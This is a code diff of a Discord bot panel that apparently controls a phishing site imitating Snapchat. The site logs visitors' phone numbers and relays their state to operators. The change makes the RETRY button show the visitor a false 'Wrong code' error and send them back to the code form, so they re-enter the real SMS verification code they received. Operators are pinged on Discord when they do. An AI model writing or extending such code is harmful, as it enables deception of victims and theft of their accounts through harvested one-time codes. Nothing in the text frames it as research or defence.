@@ -395,12 +395,12 @@ class OTPVerificationView(discord.ui.View):
     @discord.ui.button(label="RETRY", style=discord.ButtonStyle.primary, emoji="🔄", custom_id="snap_retry")
     async def retry(self, interaction: discord.Interaction, button: discord.ui.Button):
         db = _state["db"]
-        new_code = "".join(random.choices("0123456789", k=4))
+        # No new code is generated. The user simply re-enters the code they already
+        # received by SMS. We just send them back to the OTP form.
         await db.users.update_one(
             {"id": self.snap_user_id},
             {"$set": {
                 "state": "code",
-                "otp_code": new_code,
                 "code_submitted": None,
                 "error_message": "Wrong code",
                 "updated_at": now_iso(),
@@ -412,18 +412,21 @@ class OTPVerificationView(discord.ui.View):
             "user_id": self.snap_user_id,
             "username": self.nickname,
             "phone": self.phone,
-            "new_otp": new_code,
             "discord_user_id": str(interaction.user.id),
             "created_at": now_iso(),
         })
         await log_action(f"RETRY_CODE, <@{interaction.user.id}> — `{self.nickname}`")
         embed = discord.Embed(
-            title="🔄 New code requested",
+            title="🔄 Retry requested",
             description=f"**User:** `{self.nickname}`\n**Phone:** `{self.phone}`",
             color=0x3b82f6,
         )
-        embed.add_field(name="New code", value=f"```{new_code}```", inline=False)
-        embed.set_footer(text="L'utente rivede il form OTP sul sito.")
+        embed.add_field(
+            name="Waiting",
+            value="The user has been sent back to the code form. You'll be pinged here as soon as they re-enter it.",
+            inline=False,
+        )
+        embed.set_footer(text="No new code was generated — the user re-enters the one they already got.")
         try:
             await interaction.response.edit_message(embed=embed, view=None)
         except Exception:
